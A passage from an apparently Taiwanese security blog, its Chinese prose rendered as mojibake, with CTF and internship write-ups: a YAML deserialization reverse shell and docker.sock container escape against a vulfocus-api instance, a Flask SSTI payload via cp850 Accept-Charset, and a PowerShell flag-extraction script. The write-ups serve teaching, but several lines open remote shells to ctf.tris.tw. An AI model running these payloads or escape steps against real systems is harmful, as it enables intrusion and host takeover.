<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;layout_raw_content&quot;</span><span class="punctuation">:</span><span class="string">&quot;!!python/object/apply:os.system\n- |\n python3 -c &#x27;import os,pty,socket;s=socket.socket();s.connect((\&quot;ctf.tris.tw\&quot;,8080));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\&quot;bash\&quot;)&#x27;\n&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>è‡³æ­¤ï¼Œæˆ‘å€‘æˆåŠŸ compromise äº† <code>vulfocus-api</code></p>
<h3 id="Docker-Escape"><a href="#Docker-Escape" class="headerlink" title="Docker Escape"></a>Docker Escape</h3><p>æ‹¿åˆ° <code>vulfocus-api</code> çš„ shell å¾Œï¼Œè¦åš docker escape å°±å¾ˆç°¡å–®äº†ï¼Œå› ç‚º <code>vulfocus-api</code> å·²ç¶“å°‡å®¿ä¸»çš„ docker.sock çµ¦ mount é€²ä¾†äº†ï¼Œæˆ‘å€‘åªè¦ç”¨ä»–å‰µä¸€å€‹ privileged container å°±å¯ä»¥äº†ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> docker</span><br><span class="line">client = docker.DockerClient(base_url=<span class="string">&#x27;unix://var/run/docker.sock&#x27;</span>)</span><br><span class="line">client.images.pull(<span class="string">&quot;debian&quot;</span>)</span><br><span class="line">container = client.containers.create(image=<span class="string">&quot;debian&quot;</span>,command=<span class="string">&quot;/bin/bash&quot;</span>,name=<span class="string">&quot;pwned&quot;</span>,stdin_open=<span class="literal">True</span>,tty=<span class="literal">True</span>,privileged=<span class="literal">True</span>)</span><br><span class="line">container.start()</span><br><span class="line">container.exec_run(<span class="string">&quot;bash -i 5&lt;&gt; /dev/tcp/ctf.tris.tw/8081 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>æˆåŠŸæ‹¿åˆ°å®¿ä¸»æ©Ÿçš„ shell</p>
<h2 id="å¾Œè¨˜"><a href="#å¾Œè¨˜" class="headerlink" title="å¾Œè¨˜"></a>å¾Œè¨˜</h2><p>é€™å€‹å°ˆæ¡ˆæ˜¯åœ¨ DEVCORE å¯¦ç¿’æ™‚æ¥è§¸åˆ°çš„ï¼Œæ•´å€‹éç¨‹å…¶å¯¦è » tricky çš„ï¼Œä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡æ‰“ web æ‰“åˆ°éœ€è¦ç”¨åˆ° MitM Attackï¼Œç®—æ˜¯ä¸€å€‹ç‰¹åˆ¥çš„ç¶“é©—ï¼Œæ•´å€‹éç¨‹å¤§æ¦‚èŠ±äº†å…©å€‹ç¦®æ‹œï¼ˆä¸»è¦æ˜¯å› ç‚ºå¤§éƒ¨åˆ†çš„ç¨‹å¼ç¢¼éƒ½å¾ˆ spaghetti çš„ï¼‰ï¼Œæˆ‘è¦ºå¾—æœ€å¤§çš„æ”¶ç©«å°±æ˜¯ç¿» code çš„èƒ½åŠ›è®Šå¼·äº† (ï¿£â–½ï¿£) </p>
<p>æœ¬æ¬¡ç¶“é©—ä¹ŸåŒæ­¥åœ¨æœŸæœ«çš„<a href="tba.pdf">å¯¦ç¿’ç”Ÿç™¼è¡¨</a>åŒæ­¥åˆ†äº«ï¼Œæ„Ÿè¬å°å¸« Mico è®“æˆ‘èŠ±å…©å€‹ç¦®æ‹œåœ¨å¹³å°ä¸Šé¢äº‚æä¸€é€šã€‚</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2024-12-07T11:30:27.000Z" title="2024/12/7 ä¸‹åˆ7:30:27">2024-12-07</time>ç™¼è¡¨</span><span class="level-item"><time dateTime="2024-12-07T14:04:45.508Z" title="2024/12/7 ä¸‹åˆ10:04:45">2024-12-07</time>æ›´æ–°</span><span class="level-item"><a class="link-muted" href="/categories/Cybersecurity/">Cybersecurity</a><span>Â /Â </span><a class="link-muted" href="/categories/Cybersecurity/CTF/">CTF</a><span>Â /Â </span><a class="link-muted" href="/categories/Cybersecurity/CTF/Writeup/">Writeup</a></span><span class="level-item">13 åˆ†é˜è®€å®Œ (å¤§ç´„1955å€‹å­—)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2024/12/07/2024-CGGC-CTF-Final-Writeup/">2024 CGGC CTF Final Writeup</a></p><div class="content"><p>é€™æ¬¡å¹«åœ‹ç¶²ä¸­å¿ƒçš„CGGC ç¶²è·¯å®ˆè­·è€…æŒ‘æˆ°è³½å‡ºé¡Œï¼Œç¸½å…±å‡ºäº†å…©é¡Œ medium ï¼Œåˆ†åˆ¥æ˜¯ <code>web</code> çš„ <code>Converter</code> å’Œ <code>misc</code> çš„ <code>cat flag</code></p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Converter"><a href="#Converter" class="headerlink" title="Converter"></a>Converter</h2><p>é€™æ˜¯ä¸€å€‹ç·¨ç¢¼çš„ç¶²ç«™ï¼Œå¯ä»¥ç·¨ç¢¼å’Œè§£ç¢¼ <code>base16</code> &#x2F; <code>base32</code> &#x2F; <code>base64</code> &#x2F; <code>base85</code> ç­‰ä¸åŒç¶²ç«™<br>å¾Œç«¯æ˜¯ä½¿ç”¨ <code>Flask</code> å¯«çš„ï¼Œç‚ºäº†é˜²æ­¢ <code>SSTI</code> ï¼Œåœ¨ <code>render_template_string</code> ä¹‹å‰æˆ‘æŠŠä¸€äº›åœ°æ–¹ <code>HTML encode</code> äº†</p>
<p><code>encode</code> æ™‚ <code>input</code> æœƒè¢« <code>HTML encode</code><br><code>decode</code> æ™‚ <code>input</code> å’Œ <code>result</code> éƒ½æœƒè¢« <code>HTML encode</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> render_template_string(</span><br><span class="line">    RESULT_TEMPLATE.<span class="built_in">format</span>(</span><br><span class="line">    input_data=data, <span class="comment"># çš†æœƒè¢« HTMLencode</span></span><br><span class="line">    conversion_type=conversion_type,</span><br><span class="line">    action=action,</span><br><span class="line">    result=result <span class="comment"># åªæœ‰ decode æ™‚æœƒè¢« HTMLencode</span></span><br><span class="line">))</span><br></pre></td></tr></table></figure>

<p>å› æ­¤ï¼Œæƒ³è¦ SSTI å°±åªå‰©ä¸‹æŠŠæ±è¥¿æ‹¿å» encode ä¹‹å¾Œè®Šæˆæ€ªæ€ªçš„æ±è¥¿äº†ï¼Œé‚£ä»€éº¼ç‹€æ³ä¸‹ encode æœƒè·‘å‡ºæ€ªæ€ªçš„æ±è¥¿å‘¢ï¼Ÿå…¶å¯¦å»æŸ¥ä¸€ä¸‹å››ç¨®ç·¨ç¢¼æ‡‰è©²å°±å¯ä»¥å¾ˆå¿«ç™¼ç¾ base85 çš„ index table æœ‰å¯ä»¥åˆ©ç”¨çš„æ±è¥¿ï¼ˆ<code>&#123;</code> å’Œ <code>&#125;</code>ï¼‰ï¼Œä½†é€™æ¨£å…¶å¯¦é‚„æ˜¯ä¸å¤ çš„ï¼Œå› ç‚ºå¦‚æœæƒ³è¦æ§‹é€ å‡º <code>&#123;&#125;</code> é‚£ <code>input</code> æœƒéœ€è¦å‚³å…¥ä¸å­˜åœ¨çš„å­—å…ƒï¼Œåå <code>URL encoding</code> åˆåªæœƒè§£ç¢¼ç‰¹å®šçš„ <code>binary data</code>ã€‚</p>
<p>é‚£æ€éº¼è¾¦å‘¢ï¼Œå…¶å¯¦åœ¨ <code>encoding</code> çš„æ™‚å€™é‚„æœ‰ç¬¬äºŒå€‹å¯æ§çš„åœ°æ–¹ï¼Œé‚£å°±æ˜¯ <code>Accept-Charset</code> </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">encoding = request.headers.get(<span class="string">&#x27;Accept-Charset&#x27;</span>,<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&#x27;utf&#x27;</span>,<span class="string">&#x27;ascii&#x27;</span>,<span class="string">&#x27;latin&#x27;</span>,<span class="string">&#x27;windows&#x27;</span>,<span class="string">&#x27;cp&#x27;</span>]:</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> encoding:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Unsupported encoding&quot;</span>&#125;), <span class="number">400</span></span><br></pre></td></tr></table></figure>

<p>å¾Œç«¯æœƒæ ¹æ“šè¼¸å…¥çš„ <code>charset</code> å»å°‡å‚³å…¥çš„è³‡æ–™ <code>encode</code> (ä½†æ˜¯åƒ…é™æ¯”è¼ƒå¸¸è¦‹ç³»åˆ—çš„ç·¨ç¢¼)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elif</span> conversion_type == <span class="string">&quot;base85&quot;</span>:</span><br><span class="line">    result = base64.b85encode(data.encode(encoding)).decode(encoding)</span><br></pre></td></tr></table></figure>

<p>æœ‰äº†é€™å…©å€‹å¯æ§çš„åœ°æ–¹ï¼Œæˆ‘å€‘å°±å¯ä»¥æ‰¾åˆ°å¹¾ç¨®ç·¨ç¢¼æ–¹å¼ï¼ŒæŠŠä¸å­˜åœ¨çš„ç·¨ç¢¼è®Šæˆå­˜åœ¨çš„å­—å…ƒç•¶æˆè¼¸å…¥ï¼Œ <code>fuzz</code> ä¸€ä¸‹å°±å¯ä»¥æ‰¾å‡ºæœ‰æ•ˆçš„ <code>payload</code><br>æˆ‘é€™é‚Šæ˜¯ä½¿ç”¨ <code>cp850</code> å»æƒ³è¾¦æ³•æ§‹é€ å‡º <code>&#123;&#123;config&#125;&#125;</code> ï¼Œæœ€å¾Œæ‰¾åˆ° <code>qX%15rx%15â–’BÃ â””â”‚</code> å¯ä»¥å¼„å‡º <code>aaa&#123;&#123;config&#125;&#125;1</code></p>
<p>æœ€çµ‚ <code>payload</code> ï¼š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /api/convert HTTP/1.1</span><br><span class="line">Accept-Charset: cp850</span><br><span class="line"></span><br><span class="line">data=qX%15rx%15â–’BÃ â””â”‚&amp;conversion_type=base85&amp;action=encode</span><br></pre></td></tr></table></figure>
<p><img src="/2024/12/07/2024-CGGC-CTF-Final-Writeup/1.png"></p>
<blockquote>
<p>flag: <code>CGGC&#123;&#39;ÃÃ‘â”Ã•â–’Ã Ã•â–’Ã ÃÃ‘â”ÃÃ‘â”ÃÂ©Ã³ÃÂ¬Ã†ÂµÂ£Ã¬&#39;.encode(&#39;cp850&#39;).decode(&#39;utf-8&#39;)&#125;</code></p>
</blockquote>
<h3 id="å¾Œè¨˜"><a href="#å¾Œè¨˜" class="headerlink" title="å¾Œè¨˜"></a>å¾Œè¨˜</h3><p>æˆ‘çœ‹åˆ°è¶…å¤šäººäº¤çš„ <code>flag</code> æ˜¯æŠŠä¸­é–“é‚£å¨æ‹¿å» <code>decode</code> è®Šæˆ <code>CGGC&#123;è¥¿å±…å±…è¥¿è¥¿è¸¢èª’æœ&#125;</code> ï¼Œç„¶å¾Œç™¼ç¾ä¸æœƒéåˆæ”¹æˆ <code>CGGC&#123;CGGCCTF&#125;</code> &#x2F; <code>CGGC&#123;cggcctf&#125;</code> æœ€å¾Œæ‰äº¤ä¸Šé¢çš„ï¼Œè¶…ç´šå¥½ç¬‘æˆ‘å¾ˆæŠ±æ­‰æŠ±æ­‰ã„‰å¿ƒ</p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Cat-Flag"><a href="#Cat-Flag" class="headerlink" title="Cat Flag"></a>Cat Flag</h2><p>é€™é¡Œæ˜¯çµ¦ä½¿ç”¨è€…ä¸€å€‹ <code>powershell</code> ï¼Œå°‡ <code>flag</code> å¯«åœ¨åœ–ç‰‡è£¡é¢ï¼Œé€é <code>AES-CBC</code> åŠ å¯†å¾Œæ”¾åœ¨è³‡æ–™å¤¾è£¡é¢ï¼ˆæˆ‘æœƒçµ¦å¯†ç¢¼ï¼‰ï¼Œåƒè³½è€…è¦æƒ³è¾¦æ³•ç”¨ <code>powershell</code> å·å‡º <code>flag</code></p>
<p>æœªå…ä¹Ÿå¤ªç°¡å–®äº†å°å§ï¼Ÿæ‰€ä»¥æˆ‘åŠ äº†ä¸€äº›é™åˆ¶ï¼š</p>
<ol>
<li>ä¸èƒ½é€£ç¶²ï¼Œå°å¤–é€£ç·šé€šé€š <code>DROP</code> æ‰</li>
<li>æŒ‡ä»¤é•·åº¦ä¸èƒ½è¶…é 512 å€‹å­—å…ƒ</li>
<li>è¼¸å‡ºå­—å…ƒæ•¸é‡ä¸èƒ½è¶…éæª”æ¡ˆæœ¬èº«å¤§å°</li>
<li>æ¯å€‹ <code>instancer</code> åªèƒ½è¼¸å…¥ä¸€è¡ŒæŒ‡ä»¤</li>
<li>æ¯æ¬¡é‡é–‹ <code>instancer</code> éƒ½æœƒç”¨ä¸åŒå¯†ç¢¼åŠ å¯†</li>
</ol>
<p>æ‰€ä»¥ï¼Œæƒ³è¦å¼„å‡º flag åªå‰©ä¸‹ä¸€æ¢è·¯äº†ï¼Œé‚£å°±æ˜¯ <code>cat flag</code> </p>
<p>ä½†è¦æ€éº¼è¼¸å‡ºå‘¢ï¼Ÿå¤§å®¶é¦¬ä¸Šè¯æƒ³åˆ°çš„æ‡‰è©²éƒ½æœƒæ˜¯ <code>Base64</code> ï¼Œä½†æ˜¯å…¶å¯¦ <code>base64</code> æœƒæŠŠè³‡æ–™è®Šæˆå¤§èƒ–å‘†ï¼ˆåŸæœ¬8å€‹ä¸€çµ„çš„è³‡æ–™è®Šæˆ6å€‹ä¸€çµ„ï¼‰ï¼Œæ‰€ä»¥æ¯”è³½ç¾å ´å°±æœƒçœ‹åˆ°ä¸€å †äººå¼„å‡ºä¾†çš„åœ–ç‰‡é•·é€™æ¨£ï¼š<br><img src="/2024/12/07/2024-CGGC-CTF-Final-Writeup/2.png"></p>
<p>å•Š <code>flag</code> å’§ï¼Ÿåœ¨ä¸‹é¢è¢«åˆ‡æ‰äº†</p>
<p>æˆ‘é æœŸçš„è§£æ³•æœ‰å…©ç¨®ï¼š</p>
<ol>
<li>ç”¨ <code>base64</code> åˆ‡ç‰‡æŠ“ä¸‹ä¾†ï¼Œå› ç‚ºæœ‰çµ¦å¯†ç¢¼äº†ï¼Œæ‰€ä»¥å¯ä»¥é€éç¬¬ä¸€çµ„çš„æ˜æ–‡ä½¿ç”¨ç¬¬äºŒçµ„çš„å¯†ç¢¼åå‘åŠ å¯†å›å»å†å’Œç¬¬äºŒçµ„çš„ä¸‹åŠèº«åˆä½µæˆå®Œæ•´çš„åœ–ç‰‡ï¼ˆé€™é‚Šæ˜¯ CBC çš„ block cipher æ‰€ä»¥è¦æ³¨æ„ä¸è¦åˆ‡çˆ›äº†æœƒæœ‰ padding çš„å•é¡Œï¼‰</li>
<li>å› ç‚ºæ˜¯é™åˆ¶ <code>char</code> æ‰€ä»¥å¯ä»¥æƒ³è¾¦æ³•æŠŠæ¯å€‹ <code>byte</code> è½‰æˆè‡ªè¨‚çš„å¯¬å­—ç¯€å°±å¯ä»¥ä¸€æ¬¡è¼¸å‡ºæ•´å€‹æª”æ¡ˆäº†ï¼Œä½†æ˜¯ä»–åˆæœ‰é™åˆ¶æŒ‡ä»¤åªèƒ½ <code>512 char</code> ï¼Œæ‰€ä»¥å¯ä»¥æ‰¾ä¸€ä¸‹æœ‰æ²’æœ‰ä»€éº¼å…§å»ºçš„ç·¨ç¢¼æ–¹å¼æ˜¯å¯ä»¥æ¶µè“‹åˆ°å¤§éƒ¨åˆ†çš„çµ„åˆï¼Œç„¶å¾Œåœ¨è‡ªè¨‚æ²’æ¶µè“‹åˆ°çš„ç·¨ç¢¼å°±å¯ä»¥äº†ï¼Œæˆ‘é€™é‚Šæ˜¯ç”¨ä¸€å€‹å¤è€çš„ç·¨ç¢¼ <code>X-Europa</code> æŠŠæª”æ¡ˆ print å‡ºä¾†</li>
</ol>
<p>ç·¨ç¢¼ï¼š</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$bytes</span> = [<span class="type">System.IO.File</span>]::ReadAllBytes(<span class="string">&quot;cat.flag&quot;</span>);<span class="variable">$compressedStream</span> = <span class="built_in">New-Object</span> System.IO.MemoryStream;<span class="variable">$result</span>=<span class="string">&quot;&quot;</span>;<span class="variable">$encoding</span>=[<span class="type">System.Text.Encoding</span>]::GetEncoding(<span class="string">&quot;x-europa&quot;</span>);<span class="keyword">ForEach</span> (<span class="variable">$byte</span> <span class="keyword">in</span> <span class="variable">$bytes</span>)&#123;<span class="keyword">if</span> (<span class="variable">$byte</span> <span class="operator">-eq</span> <span class="number">0</span>)&#123;<span class="variable">$result</span>+=<span class="string">&quot;å—¨&quot;</span>&#125;<span class="keyword">elseif</span>(<span class="variable">$byte</span> <span class="operator">-eq</span> <span class="number">127</span>)&#123;<span class="variable">$result</span>+=<span class="string">&quot;å“ˆ&quot;</span>&#125;<span class="keyword">else</span>&#123;<span class="variable">$result</span>+=<span class="variable">$encoding</span>.GetString(<span class="variable">$byte</span>)&#125;&#125;;<span class="variable">$result</span></span><br></pre></td></tr></table></figure>

<p>è§£ç¢¼ï¼š</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$encodedResult</span> = <span class="variable">$result</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$encoding</span> = [<span class="type">System.Text.Encoding</span>]::GetEncoding(<span class="string">&quot;x-europa&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$decodedBytes</span> = <span class="built_in">New-Object</span> System.Collections.Generic.List[<span class="built_in">byte</span>]</span><br><span class="line"></span><br><span class="line"><span class="variable">$i</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$encodedResult</span>.Length) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$encodedResult</span>.Substring(<span class="variable">$i</span>, <span class="number">1</span>) <span class="operator">-eq</span> <span class="string">&quot;å—¨&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$decodedBytes</span>.Add(<span class="number">0</span>)</span><br><span class="line">        <span class="variable">$i</span> += <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> (<span class="variable">$encodedResult</span>.Substring(<span class="variable">$i</span>, <span class="number">1</span>) <span class="operator">-eq</span> <span class="string">&quot;å“ˆ&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$decodedBytes</span>.Add(<span class="number">127</span>)</span><br><span class="line">        <span class="variable">$i</span> += <span class="number">1</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$char</span> = <span class="variable">$encodedResult</span>.Substring(<span class="variable">$i</span>, <span class="number">1</span>)</span><br><span class="line">        <span class="variable">$byte</span> = <span class="variable">$encoding</span>.GetBytes(<span class="variable">$char</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="variable">$decodedBytes</span>.Add(<span class="variable">$byte</span>)</span><br><span class="line">        <span class="variable">$i</span> += <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">[<span class="type">System.IO.File</span>]::WriteAllBytes(<span class="string">&quot;flag.enc&quot;</span>,<span class="variable">$decodedBytes</span>)</span><br><span class="line">openssl enc <span class="literal">-d</span> <span class="literal">-aes-256-cbc</span> <span class="literal">-pbkdf2</span> <span class="operator">-in</span> flag.enc <span class="literal">-out</span> flag.jpg <span class="literal">-k</span> <span class="variable">$password</span></span><br></pre></td></tr></table></figure>

<p>å¼„å‡ºä¾†çš„è³‡æ–™å¤§æ¦‚æœƒé•·é€™æ¨£ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Salted__â—€Â¶8Î®ÏÃªWÎ’â–²Ã€Â§Â§Î¤â•‘ÎÃ“CÎ–â†•Ã‰3$Ã”oÎ¿â”‚Î«*Ã¡â€¼Î±Ï,&#123;â”˜Ã‡Ã•yPUÎªÏ‡Z\Ã¦UÎ°al!Ã«;ÎÎˆ&gt;â™¬Î„8nÃ†sÃ‚Î°Î·Uv0ZÎ‡HOÂ¡Î»gâ—˜â”‚.~â”˜Ïâ†•Ã²Î¥bQâ–¼Î–Î‰PÃœÎï£¿Ã¼ÎºÏ‡â”˜ÎÃ„:qâ”€Ã‰â””xÎ½ÏŠÃ®/&#x27;Î·ÎŠ5Î¯Ã¯Î?Ã¨Î˜QÎ½&gt;Î³0b*kÏ‚O6Dvâ””â•‘AÃ¯Î¯&amp;tâ—™ÂºÏ‰$â†•Â°Î´Î„Â§Î¥Ã¤Î¤nÎ†1Ã¶â™‚CÎ¿Jâ–¼â™ª;Î²JÎ¥Î§(Ã¤.Ã³hÏâ•2Ã…E%Î´Ã•â—™â—™â•G^ÎŒ!Ïˆâ™‚Mâ—‹Jâ•šÂ¿9ÂºYÎ¥Î ÎŸÃ\â—‹TAlÃ©rÎ½yÎ¦Î²*Ã„Î»zÂ¡&#x27;ÎÎ¯Ãªâ†’ÃÃ¬Î¦Ã¶Î¯Ï‚â•‘7Ã‘+_â˜¼/v/Î˜Ã Î¾4GÎ£LÎ¬Ã¦Sâ™¬6+FÏÎ¸Î•Ã‘RÃ´sÃ“Ï„Î´/â”˜YÃ˜Ã Ã…Â¿ÎÏŒ BÏ‰yâ†’Î‰Ï‡4e&quot;Ï‡Ã…Î·Î±Hå“ˆÎ¸ÏŒÏˆÏvu8cÃ§Ã£vÃŸÎ®â•PqÎ-â€¼Î—Ã‚â”€ÏŠÎ‰â”‚â†•Ï„UEÃŠâ•‘Î†9ÏÎ—Î­Î˜DÃ¨e&amp;å“ˆÃ–ÃÎ¹wÏ†Î®â—™pÎ¬ÎµÎ•Ã©&quot;â•šÃ‹P)9â—™â•å—¨Ã¡Ï‰â–¼0â†“å“ˆâ–²Î¯â†’SÎ”ÎµTSÃ²ï£¿kÂ£ÏŒÃ•ÎœÃ„Î¡^â”L%â™‚oÎ¿Ã‘Î¥Ã¼Î¼Ã±Î¤Î·Ã²ÏÎ¡Ãºt^Ã€Î“VRÎµÎ´â†‘Î¾Î°)Ãœâ—‹â•eNâ”‚Ãš$b+$Â°ÏŠ3ÃƒÂ¶â–²Î£Ã§Î½â”INâ™‚ÃµÎ¨Îˆ7zâ†[:)Ã©Ã8â™ªâ—™ÂºÃ¶QMÎ°Î½â”˜QsÏƒÎ‰â™ªâ†‘IÏÎœYÎŠÂºÂ°Ã¼Ã¯Î‡jrâ†“S&#x27;Îµâ€¼Î·Î¶Ï‚Â¡4Ã˜Â§ÎˆÎŸÃ…-â•Ï„ÃšÏƒBÎ—?BÎ™/xâ†+Ã„aâ™¬`g/Ï‹ÎŸÎ¤Ã«Kâ•‘]ÃŠÃ£ï£¿Ï‰â†ÎÃ€Â£_Â¡Î±Ã³Ã‚Î°Ã^Î±â””zÏ‹pâ•”NÃ¯Î‡Ã¸Ã¡Ã¢2Î˜Ã‹ÎŒÎ›Ã€LL%tÃ•Ã“DÎ»mIâ—˜Î¦ÃŠâ†‘Î¾K-^Ã«+,\Î³Ã„rÃŸPâ”€Ã³ÃŠhÎ·&quot;4â™‚â™¬Î¯:Ï&quot;IÃ£6jÃ‘Î”ÎŒÂªâ”ŒÂ§/[O]Î±Ã¼Ã¶Î”Ã‚â•šâ”:0Ãµ1â™‚ÏBÎ¸Î¿Ã€Ã‘BghÏ‹RsÂºÃ€å“ˆF&quot;â–¼â—˜Ã®ÎœaÎ¯;qâ•”ÎÏÎ§Î¡BÃšâ”ŒÎ‡F7å“ˆÏÏ†å“ˆ Î¼Ã¸&lt;Ã€Î„)ÂªÃ¶â”€Â¿ÃÎ§Ï„â•”Î¦hÏMnÎ¶ï£¿Î¡Ã˜zâ—˜cÂªÃ†Î¥ÃªÎ•&quot;Ã _FÎ£]Î¤Î¿Ï€.Î›râ™¬â”ŒÃ˜Î“#â™‚Î­â•‘XÃ¡Â¶Î‰â†”Ã‚Î’Ï8/fSV@Ï…ÃÃ•fÎ“3Î¶ÎšEÎ‡ÏŒÏŠ1Ã£A+|&#x27;Ã‹Ã‘Ï‚â†“hOâ”˜hâ•ša&quot;|Ã¯Ã¢9Î†!Ã¨Ã dÃ‰gâ•xÎ™Ã³Ã¦eÎªÃ±Î®R#&lt;Ã±4&#x27;4ÃµUÎˆÎ¬â†’ÎÎ±â—˜Ã¹,Ã¤Î­;?Hâ”‚&#125;,Ï€7aÎ’â—€Î·â•‘Ï‡Î\xâ—™e1ÏÃ‚Ã‚@VÎxâ€¼6Î›Ã…zÏ†&amp;ÏÃ‰Ã¢â—‹ÏŒeÎ‘Î¹&lt;â”€@Â¶ÎÎŠu+Â°ÎŸÂªÎµÎÎÎ‘Î™d=7Ã¶Ã…â•+ÃŸÃ\Ã®Î™|å—¨fÂ£Î›Ã±Ã¹Î¨ÃŸWÃ‚=Î„*Î‡eO,Î„Î¬Ï‰@XÎ¨C,Ã¬Ã±uÎ„t JÃ„â–²dÃ®Ã®Ã³Ã®Ï‰I.ÏÃ‘Â¶Ã¦uÃ¹ÃÏ€GÃ´Î¡Î±jÃ¬Î—Ã¹â†‘Ãµ=ÏÃ»Î‘ÃªÎ·TÃ¦&#123;ÃNVroKÃ¼Î†Ïg&lt;euÃ‚Î Î±`Î®Î¾â†“Î‘kÏŒâ™¬+Â§Ã”ÏŒxWâ–²Î†*Î¶Î˜Î§Î°Ã£ÎŒâ•—LÃ¦+ â”ÏÃ¼0Î„mlÏŠ4â”ŒÎ™]Ï…ÃªÎ±Ï†bÂ¿ÎŸÏŒâ”‚]:\Ã¬Î¹Î› yÂ¶Î¬Îœ(HÃºÃ…YÂ§â—˜#ÃƒÎ•Ï†Ã Så—¨Ã†Ã¹â†“Ã‹Ãª9GÏÃ¦.â–¼NÎ–JÏ‡â•šPÎ±Ã¨â”@Ã(Â£nÃ‚eÃ¬Âºâ†“maqÂ§Î0nÃ˜Ã»EÃšÃ•hå“ˆkDGaÃ­Ï…â†”Ã³@SmabÎ°ÎºTLâ€¼/Îy`â™€sÎ &#123;mÎ‰KENeÎ’ÎÎºÎ¥Î†&lt;Î“Â¶!â–¶@â•—â”ŒMÃ€Ï‹VvÂ¿$iâ†•Ãâ†‘aUEÎˆxâ—€^Î¿ÎŒÃ»Pâ•šâ—€Ã MÏŠk@â–²Â£Ã§Ã¨AÃ„vzÃ†NÃ¦Ã‡Î­Î»9Ï‰â–²xtå—¨Âªâ””Î“nÃ®AÎ¸Î¬Ã¯#Î—Ã¨â†•Ãƒ |yâ•šÎ­Ã£Î¤ÏŒGjÏtÎ‡ÏÃ¸â†“râ†‘Ã‰ÎºtÃ¥Ï‚1y=Ã‰â™€1AÎ„Ï‰=â•â”ÎÎ 